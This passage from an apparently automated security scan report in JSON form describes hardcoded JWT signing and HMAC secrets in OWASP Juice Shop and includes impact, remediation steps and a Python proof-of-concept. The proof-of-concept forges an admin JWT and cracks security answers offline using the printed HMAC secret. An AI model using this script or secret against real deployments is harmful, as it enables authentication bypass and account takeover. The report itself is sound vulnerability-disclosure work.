          "properties": {
            "security-severity": "9.1",
            "strix": {
              "id": "vuln-0013",
              "severity": "critical",
              "cvss": 9.1,
              "timestamp": "2026-05-09 09:49:20 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/rest/user/login",
              "method": "POST",
              "cwe": "CWE-798",
              "impact": "An attacker who obtains the hardcoded private key (from the public repository) can:\n\n- Forge JWT tokens for any user, including administrators, achieving complete authentication bypass and privilege escalation without credentials\n- Maintain persistent access by minting long-lived tokens that bypass all authentication controls\n- Impersonate any user for data access, order manipulation, or administrative actions\n\nWith the hardcoded HMAC secret, an attacker can:\n- Compute valid HMAC hashes for arbitrary security answer guesses, effectively brute-forcing security answers offline\n- Bypass the password reset mechanism for any account by testing candidate answers locally\n\nTogether, these constitute a complete authentication system compromise.",
              "technical_analysis": "Two hardcoded secrets are present in `lib/insecurity.ts`:\n\n1. **RSA Private Key** (line 23): The full RSA private key is embedded as a string constant:\n```typescript\nconst privateKey = '-----BEGIN RSA PRIVATE KEY-----\\r\\\\r\\n-----END RSA PRIVATE KEY-----'\n```\n\nThis key is used on line 56 to sign JWTs:\n```typescript\nexport const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })\n```\n\n2. **HMAC Secret** (line 44): The secret for hashing security answers:\n```typescript\nexport const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj').update(data).digest('hex')\n```\n\nRoot cause: Secrets are committed to version control and embedded in application code rather than loaded from a secure external source (environment variables, secrets manager, or hardware security module).",
              "remediation_steps": "1. Remove all hardcoded cryptographic keys from source code immediately. Generate new RSA key pairs and HMAC secrets that are never committed to version control.\n\n2. Load the JWT private key from an environment variable or a secrets management service (e.g., AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) at application startup.\n\n3. Rotate the compromised keys: since the current private key is publicly known, all existing JWTs must be considered compromised. Force re-authentication for all users after deploying new keys.\n\n4. Replace the hardcoded HMAC secret with a per-deployment secret loaded from environment configuration. Consider adding a per-user component (e.g., user ID) to the HMAC input to prevent cross-user attacks even with secret knowledge.\n\n5. Add pre-commit hooks and CI/CD checks (e.g., gitleaks, trufflehog) to prevent future key material from being committed to the repository.\n\n6. Add the `encryptionkeys/` directory to `.gitignore` and document the key provisioning process for deployment.",
              "poc": {
                "description": "To reproduce JWT forgery:\n\n1. Extract the private key from the source code at `lib/insecurity.ts` line 23.\n2. Use the key to sign a forged JWT token with arbitrary claims (e.g., admin role, any user ID).\n3. Send the forged token in an Authorization header to any protected endpoint.\n4. Observe that the server accepts the forged token as valid and grants access.\n\nTo reproduce HMAC bypass:\n1. Extract the HMAC secret `'pa4qacea4VK9t9nGv7yZtwmj'` from line 44.\n2. Compute HMAC-SHA256 of candidate security answers using this secret.\n3. Compare against stored answer hashes to identify the correct answer offline.\n4. Use the discovered answer to reset any user's password.",
                "script": "import jwt\nimport hmac\nimport hashlib\nimport json\nimport time\n\n# === JWT Forgery PoC ===\n# Private key extracted from lib/insecurity.ts line 23\nPRIVATE_KEY = \"\"\"-----BEGIN RSA PRIVATE KEY-----\\n-----END RSA PRIVATE KEY-----\"\"\"\n\n# Forge an admin token\nforged_payload = {\n    \"status\": \"success\",\n    \"data\": {\n        \"id\": 1,\n        \"username\": \"admin\",\n        \"email\": \"admin@juice-sh.op\",\n        \"password\": \"0192023a7bbd73250516f069df18b500\",\n        \"role\": \"admin\",\n        \"deluxeToken\": \"\",\n        \"lastLoginIp\": \"0.0.0.0\",\n        \"profileImage\": \"/assets/public/images/uploads/defaultAdmin.png\",\n        \"totpSecret\": \"\",\n        \"isActive\": True\n    },\n    \"iat\": int(time.time()),\n    \"exp\": int(time.time()) + 21600  # 6 hours\n}\n\nforged_token = jwt.encode(forged_payload, PRIVATE_KEY, algorithm=\"RS256\")\nprint(\"=== JWT Forgery PoC ===\")\nprint(f\"Forged admin token: {forged_token[:80]}...\")\nprint(f\"Token length: {len(forged_token)} chars\")\nprint(\"This token will be accepted by the server as a valid admin session.\")\nprint()\n\n# === HMAC Secret Exploitation PoC ===\nHMAC_SECRET = \"pa4qacea4VK9t9nGv7yZtwmj\"\n\ndef compute_security_answer_hash(answer: str) -> str:\n    \"\"\"Replicates the hmac function from lib/insecurity.ts\"\"\"\n    return hmac.new(\n        HMAC_SECRET.encode(),\n        answer.encode(),\n        hashlib.sha256\n    ).hexdigest()\n\n# Brute-force common security answers offline\ncandidate_answers = [\"Samuel\", \"Stop'n'Drop\", \"West-2082\", \"5N0wb41L\", \"Zaya\", \"John\"]\nprint(\"=== HMAC Secret Exploitation PoC ===\")\nprint(f\"HMAC Secret: {HMAC_SECRET}\")\nprint(\"Computing offline hashes for candidate security answers:\")\nfor answer in candidate_answers:\n    h = compute_security_answer_hash(answer)\n    print(f\"  Answer '{answer}' -> {h}\")\n\nprint()\nprint(\"CONFIRMED: Hardcoded keys allow JWT forgery and offline security answer cracking\")"
              }
            }
